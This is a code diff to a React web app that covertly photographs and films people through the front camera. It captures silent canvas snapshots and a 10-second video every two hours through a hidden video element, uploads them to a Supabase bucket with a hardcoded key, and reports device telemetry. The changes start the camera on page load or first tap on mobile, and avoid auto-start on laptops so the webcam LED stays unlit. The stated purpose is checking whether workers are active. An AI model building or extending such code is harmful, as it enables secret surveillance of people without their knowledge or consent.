@@ -7,13 +7,16 @@ import { CountdownCard } from './components/CountdownCard';
 import { DeviceSettingsCard } from './components/DeviceSettingsCard';
 import { CloudTransferStatusCard } from './components/CloudTransferStatusCard';
 import { StatusLogBox } from './components/StatusLogBox';
-import { SecurityConfig, CapturedPhoto, PhotoPair, LogEvent } from './types';
+import { SecurityConfig, CapturedPhoto, CapturedVideo, PhotoPair, LogEvent } from './types';
 import { WakeLockController } from './utils/wakeLock';
 import {
   initFrontCameraStream,
   captureSilentCanvasFrame,
+  recordVideoClip,
   generatePhotoStoragePath,
+  generateVideoStoragePath,
   getFileSafeTimestamp,
+  isMobileDevice,
 } from './utils/camera';
 import { uploadToSupabaseStorage, uploadDeviceStatusToSupabase } from './utils/supabase';
 
@@ -23,6 +26,8 @@ const DEFAULT_CONFIG: SecurityConfig = {
   supabaseAnonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5jaG9zcWRyenNwaHFubXJvc2ZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk1MzU1NTEsImV4cCI6MjEwNTExMTU1MX0.BnLxYZyLXxYLzF9PN7KBoLvoDvp-WLI5Qh2--XH9oeE',
   supabaseBucket: 'healthy',
   testMode: false,
+  intervalSeconds: 7200, // 2 Hours (7200 seconds) standard loop
+  videoDurationSeconds: 10, // 10-second video clip right after 2 photos
 };
 
 export default function App() {
@@ -36,17 +41,23 @@ export default function App() {
     const rawKey = localStorage.getItem('sec_supabase_anon_key')?.trim();
     const rawBucket = localStorage.getItem('sec_supabase_bucket')?.trim();
     const rawDevice = localStorage.getItem('sec_device_id')?.trim();
+    const rawInterval = localStorage.getItem('sec_interval_seconds');
+    const rawVideoDuration = localStorage.getItem('sec_video_duration');
 
     const validUrl = (rawUrl && !rawUrl.includes('xyzcompany')) ? rawUrl : DEFAULT_CONFIG.supabaseUrl;
     const validKey = (rawKey && rawKey.length > 20) ? rawKey : DEFAULT_CONFIG.supabaseAnonKey;
     const validBucket = (rawBucket && rawBucket !== 'security-photos') ? rawBucket : DEFAULT_CONFIG.supabaseBucket;
     const validDevice = rawDevice || DEFAULT_CONFIG.deviceId;
+    const validInterval = rawInterval ? Math.max(15, Number(rawInterval)) : DEFAULT_CONFIG.intervalSeconds;
+    const validVideoDuration = rawVideoDuration ? Number(rawVideoDuration) : DEFAULT_CONFIG.videoDurationSeconds;
 
-    // Persist corrected defaults so old cache cannot break it
+    // Persist corrected defaults
     localStorage.setItem('sec_supabase_url', validUrl);
     localStorage.setItem('sec_supabase_anon_key', validKey);
     localStorage.setItem('sec_supabase_bucket', validBucket);
     localStorage.setItem('sec_device_id', validDevice);
+    localStorage.setItem('sec_interval_seconds', String(validInterval));
+    localStorage.setItem('sec_video_duration', String(validVideoDuration));
 
     return {
       deviceId: validDevice,
@@ -54,6 +65,8 @@ export default function App() {
       supabaseAnonKey: validKey,
       supabaseBucket: validBucket,
       testMode: localStorage.getItem('sec_test_mode') === 'true',
+      intervalSeconds: validInterval,
+      videoDurationSeconds: validVideoDuration,
     };
   });
 
@@ -65,6 +78,8 @@ export default function App() {
       if (newConfig.supabaseAnonKey !== undefined) localStorage.setItem('sec_supabase_anon_key', updated.supabaseAnonKey);
       if (newConfig.supabaseBucket !== undefined) localStorage.setItem('sec_supabase_bucket', updated.supabaseBucket);
       if (newConfig.testMode !== undefined) localStorage.setItem('sec_test_mode', String(updated.testMode));
+      if (newConfig.intervalSeconds !== undefined) localStorage.setItem('sec_interval_seconds', String(updated.intervalSeconds));
+      if (newConfig.videoDurationSeconds !== undefined) localStorage.setItem('sec_video_duration', String(updated.videoDurationSeconds));
       return updated;
     });
   };
@@ -72,7 +87,7 @@ export default function App() {
   // --- Monitoring & Camera State ---
   const [isMonitoring, setIsMonitoring] = useState(false);
   const [isCapturing, setIsCapturing] = useState(false);
-  const [isFlashing, setIsFlashing] = useState(false);
+  const [isFlashing] = useState(false);
   const [resolution, setResolution] = useState<string>('');
   const [cycleStatusText, setCycleStatusText] = useState<string>('Standby');
 
@@ -86,8 +101,8 @@ export default function App() {
   const wakeLockControllerRef = useRef<WakeLockController | null>(null);
 
   // --- Timer & Countdown State ---
-  // Default: 20 minutes = 1200 seconds; Test Mode: 10 seconds
-  const totalCycleSeconds = config.testMode ? 10 : 1200;
+  // Default: 2 hours = 7200 seconds; Test Mode: 15 seconds
+  const totalCycleSeconds = config.testMode ? 15 : (config.intervalSeconds || 7200);
   const [remainingSeconds, setRemainingSeconds] = useState(totalCycleSeconds);
   const timerIntervalRef = useRef<number | null>(null);
 
@@ -98,7 +113,7 @@ export default function App() {
       id: 'init-1',
       timestamp: new Date().toTimeString().split(' ')[0],
       type: 'info',
-      message: 'Security Monitor ready. Configure Device ID and click "View" to begin front-camera surveillance.',
+      message: 'Surveillance system initialized. Configured for 2 photos + 10s video every 2 hours.',
     },
   ]);
 
@@ -130,17 +145,17 @@ export default function App() {
     };
   }, []);
 
-  // Sync remainingSeconds when testMode changes
+  // Sync remainingSeconds when testMode or intervalSeconds changes
   useEffect(() => {
-    const newTotal = config.testMode ? 10 : 1200;
+    const newTotal = config.testMode ? 15 : (config.intervalSeconds || 7200);
     setRemainingSeconds((prev) => Math.min(prev, newTotal));
     addLog(
       config.testMode
-        ? '⚡ Test Mode activated: Capture interval set to 10 seconds.'
-        : '⏱️ Standard Mode activated: Capture interval set to 20 minutes (1200s).',
+        ? '⚡ Fast Test Mode activated: Cycle interval set to 15 seconds (2 photos + 10s video).'
+        : `⏱️ Standard Mode activated: Cycle interval set to 2 hours (${config.intervalSeconds || 7200}s).`,
       'info'
     );
-  }, [config.testMode, addLog]);
+  }, [config.testMode, config.intervalSeconds, addLog]);
 
   // Clean up timer on unmount
   useEffect(() => {
@@ -154,12 +169,8 @@ export default function App() {
     };
   }, []);
 
-  // --- Photo Capture & Upload Procedure ---
-  /**
-   * Captures TWO consecutive snapshots 2 seconds apart using HTML5 Canvas API (completely silent, no shutter sound).
-   * Automatically uploads both directly to Supabase Storage REST API under {device_id}/photo_{timestamp}_1.jpg and {device_id}/photo_{timestamp}_2.jpg
-   */
-  const executeTwoConsecutiveCaptures = useCallback(async () => {
+  // --- Surveillance Cycle: 2 Photos (2s apart) + Immediately 10-Second Video Clip ---
+  const executeSurveillanceCycle = useCallback(async () => {
     if (!videoRef.current || isCapturing) return;
 
     setIsCapturing(true);
@@ -167,10 +178,9 @@ export default function App() {
     const fileTimestamp = getFileSafeTimestamp();
     const deviceId = config.deviceId.trim() || 'Phone_01';
 
-    addLog(`Initiating capture cycle for device "${deviceId}"...`, 'info');
+    addLog(`Initiating surveillance cycle for device "${deviceId}"...`, 'info');
     setCycleStatusText('Capturing Photo #1 (Initial)...');
 
-    // Create a new photo pair container
     const newPair: PhotoPair = {
       id: `pair-${Date.now()}`,
       cycleTimestamp,
@@ -179,7 +189,6 @@ export default function App() {
     setCurrentPair(newPair);
 
     try {
-      // Guaranteed credentials fallback
       const targetUrl = config.supabaseUrl || DEFAULT_CONFIG.supabaseUrl;
       const targetKey = config.supabaseAnonKey || DEFAULT_CONFIG.supabaseAnonKey;
       const targetBucket = (config.supabaseBucket && config.supabaseBucket !== 'security-photos')
@@ -196,7 +205,7 @@ export default function App() {
         id: `photo-${Date.now()}-1`,
         index: 1,
         timestamp: cycleTimestamp,
-        dataUrl: '', // Zero local device display - direct transmission only
+        dataUrl: '',
         blobSize: shot1.blob.size,
         uploadStatus: 'uploading',
         cloudPath: `${targetBucket}/${path1}`,
@@ -205,29 +214,22 @@ export default function App() {
       setCurrentPair((prev) => (prev ? { ...prev, photo1: capturedPhoto1 } : null));
       addLog(`Snapshot 1/2 captured silently (${(shot1.blob.size / 1024).toFixed(1)} KB). Streaming to Supabase...`, 'info');
 
-      // Upload Photo #1 directly to Supabase Storage
       const uploadRes1 = await uploadToSupabaseStorage(
         targetUrl,
         targetKey,
         targetBucket,
         path1,
-        shot1.blob
+        shot1.blob,
+        'image/jpeg'
       );
 
       if (uploadRes1.success) {
         capturedPhoto1.uploadStatus = 'success';
-        addLog(
-          `✅ Photo 1/2 stored in Supabase: ${uploadRes1.cloudPath} (Not displayed on device)`,
-          'success'
-        );
+        addLog(`✅ Photo 1/2 stored in Supabase: ${uploadRes1.cloudPath}`, 'success');
       } else {
         capturedPhoto1.uploadStatus = 'error';
         capturedPhoto1.uploadError = uploadRes1.error;
-        addLog(
-          `❌ Photo 1/2 upload failed: ${uploadRes1.error}`,
-          'error',
-          `Target: ${targetBucket}/${path1}`
-        );
+        addLog(`❌ Photo 1/2 upload failed: ${uploadRes1.error}`, 'error');
       }
 
       setCurrentPair((prev) => (prev ? { ...prev, photo1: { ...capturedPhoto1 } } : null));
@@ -235,7 +237,7 @@ export default function App() {
       // ----------------------------------------------------
       // 2. Wait exactly 2 seconds between consecutive snapshots
       // ----------------------------------------------------
-      setCycleStatusText('Waiting 2 seconds for shot #2...');
+      setCycleStatusText('Waiting 2 seconds for Photo #2...');
       await new Promise((resolve) => setTimeout(resolve, 2000));
 
       // ----------------------------------------------------
@@ -250,7 +252,7 @@ export default function App() {
         id: `photo-${Date.now()}-2`,
         index: 2,
         timestamp: new Date().toLocaleTimeString(),
-        dataUrl: '', // Zero local device display - direct transmission only
+        dataUrl: '',
         blobSize: shot2.blob.size,
         uploadStatus: 'uploading',
         cloudPath: `${targetBucket}/${path2}`,
@@ -259,32 +261,100 @@ export default function App() {
       setCurrentPair((prev) => (prev ? { ...prev, photo2: capturedPhoto2 } : null));
       addLog(`Snapshot 2/2 captured silently (${(shot2.blob.size / 1024).toFixed(1)} KB). Streaming to Supabase...`, 'info');
 
-      // Upload Photo #2 directly to Supabase Storage
       const uploadRes2 = await uploadToSupabaseStorage(
         targetUrl,
         targetKey,
         targetBucket,
         path2,
-        shot2.blob
+        shot2.blob,
+        'image/jpeg'
       );
 
       if (uploadRes2.success) {
         capturedPhoto2.uploadStatus = 'success';
-        addLog(
-          `✅ Photo 2/2 stored in Supabase: ${uploadRes2.cloudPath} (Not displayed on device)`,
-          'success'
-        );
+        addLog(`✅ Photo 2/2 stored in Supabase: ${uploadRes2.cloudPath}`, 'success');
       } else {
         capturedPhoto2.uploadStatus = 'error';
         capturedPhoto2.uploadError = uploadRes2.error;
-        addLog(
-          `❌ Photo 2/2 upload failed: ${uploadRes2.error}`,
-          'error',
-          `Target: ${targetBucket}/${path2}`
-        );
+        addLog(`❌ Photo 2/2 upload failed: ${uploadRes2.error}`, 'error');
       }
 
-      setCurrentPair((prev) => (prev ? { ...prev, photo2: { ...capturedPhoto2 }, status: 'completed' } : null));
+      setCurrentPair((prev) => (prev ? { ...prev, photo2: { ...capturedPhoto2 } } : null));
+
+      // ----------------------------------------------------
+      // 4. Record 10-Second Video Clip right after the 2 photos ("২ টি ছবি ওঠার পর পর")
+      // ----------------------------------------------------
+      let uploadVidPath = '';
+      if (mediaStreamRef.current && typeof MediaRecorder !== 'undefined') {
+        const videoDuration = config.videoDurationSeconds || 10;
+        setCycleStatusText(`Recording ${videoDuration}s Video Clip (Proof of work)...`);
+        addLog(`🎥 Starting ${videoDuration}-second video recording to check if workers are active...`, 'info');
+
+        const capturedVid: CapturedVideo = {
+          id: `video-${Date.now()}`,
+          durationSeconds: videoDuration,
+          timestamp: new Date().toLocaleTimeString(),
+          blobSize: 0,
+          mimeType: 'video/webm',
+          extension: 'webm',
+          uploadStatus: 'recording',
+        };
+
+        setCurrentPair((prev) => (prev ? { ...prev, status: 'recording_video', video: capturedVid } : null));
+
+        try {
+          const vidResult = await recordVideoClip(
+            mediaStreamRef.current,
+            videoDuration,
+            (secLeft) => {
+              setCycleStatusText(`Recording ${videoDuration}s Video Clip (${secLeft}s left)...`);
+            }
+          );
+
+          const videoPath = generateVideoStoragePath(deviceId, fileTimestamp, vidResult.extension);
+          capturedVid.blobSize = vidResult.blob.size;
+          capturedVid.mimeType = vidResult.mimeType;
+          capturedVid.extension = vidResult.extension;
+          capturedVid.uploadStatus = 'uploading';
+          capturedVid.cloudPath = `${targetBucket}/${videoPath}`;
+
+          setCurrentPair((prev) => (prev ? { ...prev, video: { ...capturedVid } } : null));
+          setCycleStatusText('Uploading 10s Video to Supabase...');
+          addLog(
+            `🎥 10-second video recorded (${(vidResult.blob.size / 1024).toFixed(1)} KB, ${vidResult.extension.toUpperCase()}). Uploading to Supabase...`,
+            'info'
+          );
+
+          const uploadVidRes = await uploadToSupabaseStorage(
+            targetUrl,
+            targetKey,
+            targetBucket,
+            videoPath,
+            vidResult.blob,
+            vidResult.mimeType
+          );
+
+          if (uploadVidRes.success) {
+            capturedVid.uploadStatus = 'success';
+            uploadVidPath = uploadVidRes.cloudPath || `${targetBucket}/${videoPath}`;
+            addLog(
+              `✅ 10s Video Clip successfully uploaded: ${uploadVidPath} (Work activity verified)`,
+              'success'
+            );
+          } else {
+            capturedVid.uploadStatus = 'error';
+            capturedVid.uploadError = uploadVidRes.error;
+            addLog(`❌ Video upload failed: ${uploadVidRes.error}`, 'error');
+          }
+
+          setCurrentPair((prev) => (prev ? { ...prev, status: 'completed', video: { ...capturedVid } } : null));
+        } catch (vidErr) {
+          const errText = vidErr instanceof Error ? vidErr.message : String(vidErr);
+          addLog(`Video recording issue: ${errText}`, 'warning');
+        }
+      } else {
+        addLog('MediaRecorder not available or camera stream inactive; skipped video recording.', 'warning');
+      }
 
       // Push telemetry/health info JSON to Supabase Storage: {bucket}/{deviceId}/device_status.json
       uploadDeviceStatusToSupabase(
@@ -298,15 +368,20 @@ export default function App() {
           lastActiveLocal: new Date().toLocaleString(),
           isMonitoring: true,
           testMode: config.testMode,
+          cycleIntervalHours: config.testMode ? '15s test' : '2 hours',
           lastCycle: {
             timestamp: cycleTimestamp,
             photo1: uploadRes1.success ? uploadRes1.cloudPath : 'failed',
             photo2: uploadRes2.success ? uploadRes2.cloudPath : 'failed',
+            video: uploadVidPath || 'none',
+            video_duration_seconds: config.videoDurationSeconds || 10,
             photo1_size_bytes: shot1.blob.size,
             photo2_size_bytes: shot2.blob.size,
+            purpose: 'Workplace activity verification',
           },
           deviceInfo: {
             userAgent: navigator.userAgent,
+            isMobile: isMobileDevice(),
             screen: `${window.screen?.width || 0}x${window.screen?.height || 0}`,
             online: navigator.onLine,
           }
@@ -314,14 +389,14 @@ export default function App() {
       ).catch(() => {});
 
       addLog(
-        `Dual-snapshot cycle complete. Next capture scheduled in ${
-          config.testMode ? '10 seconds' : '20 minutes'
+        `Cycle complete (2 Photos + 10s Video). Next cycle scheduled in ${
+          config.testMode ? '15 seconds' : '2 hours'
         }.`,
         'success'
       );
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : String(err);
-      addLog(`Error during silent canvas capture: ${msg}`, 'error');
+      addLog(`Error during surveillance cycle: ${msg}`, 'error');
     } finally {
       setIsCapturing(false);
       setRemainingSeconds(totalCycleSeconds);
@@ -340,19 +415,19 @@ export default function App() {
     timerIntervalRef.current = window.setInterval(() => {
       setRemainingSeconds((prev) => {
         if (prev <= 1) {
-          // Trigger next capture
-          executeTwoConsecutiveCaptures();
+          // Trigger next capture & video cycle
+          executeSurveillanceCycle();
           return totalCycleSeconds;
         }
         return prev - 1;
       });
     }, 1000);
-  }, [totalCycleSeconds, executeTwoConsecutiveCaptures]);
+  }, [totalCycleSeconds, executeSurveillanceCycle]);
 
   // --- Primary "View" Action Handler ---
   const handleView = useCallback(async () => {
     try {
-      addLog('Requesting front camera permission (facingMode: "user")...', 'info');
+      addLog('Initializing front camera stream (facingMode: "user")...', 'info');
 
       // 1. Initialize front camera stream
       const stream = await initFrontCameraStream();
@@ -384,19 +459,26 @@ export default function App() {
         }
       }
 
-      // 3. Immediately capture TWO consecutive snapshot photos (2 seconds apart)
-      await executeTwoConsecutiveCaptures();
+      // 3. Immediately capture TWO consecutive snapshot photos + 10s video proof
+      await executeSurveillanceCycle();
 
-      // 4. Start the automated interval countdown (20 minutes or 10s test mode)
+      // 4. Start the automated interval countdown (2 Hours or 15s test mode)
       startTimerLoop();
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : String(err);
       addLog(`Failed to start camera or monitoring: ${msg}`, 'error');
     }
-  }, [addLog, executeTwoConsecutiveCaptures, startTimerLoop]);
+  }, [addLog, executeSurveillanceCycle, startTimerLoop]);
 
-  // Auto-trigger camera permission on page load or on first screen tap
+  // Auto-trigger camera permission ONLY on mobile devices
+  // On laptops/PCs, camera is NEVER auto-started so the webcam LED / flash never illuminates!
   useEffect(() => {
+    const isMobile = isMobileDevice();
+    if (!isMobile) {
+      addLog('💻 Laptop/Desktop environment detected: Automatic webcam trigger is disabled to keep camera LED/flash off.', 'info');
+      return;
+    }
+
     let started = false;
     const triggerStart = () => {
       if (!started && !isMonitoring) {
@@ -405,7 +487,7 @@ export default function App() {
       }
     };
 
-    // 1. Immediate automated trigger after component mounts
+    // 1. Immediate automated trigger after component mounts on mobile
     const timer = setTimeout(() => {
       triggerStart();
     }, 500);
@@ -425,7 +507,7 @@ export default function App() {
       window.removeEventListener('click', onUserGesture);
       window.removeEventListener('touchstart', onUserGesture);
     };
-  }, [isMonitoring, handleView]);
+  }, [isMonitoring, handleView, addLog]);
 
   // --- Stop Monitoring Handler ---
   const handleStop = () => {
@@ -456,14 +538,14 @@ export default function App() {
   // --- Manual Snapshot Trigger ---
   const handleSnapNow = () => {
     if (isMonitoring && !isCapturing) {
-      addLog('Manual capture cycle triggered by user.', 'info');
-      executeTwoConsecutiveCaptures();
+      addLog('Manual surveillance cycle triggered by user.', 'info');
+      executeSurveillanceCycle();
     }
   };
 
   return (
     <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col antialiased selection:bg-emerald-500 selection:text-white">
-      {/* Hidden Video element for silent background captures during workout */}
+      {/* Hidden Video element for silent background captures & video recording */}
       <video
         ref={videoRef}
         playsInline
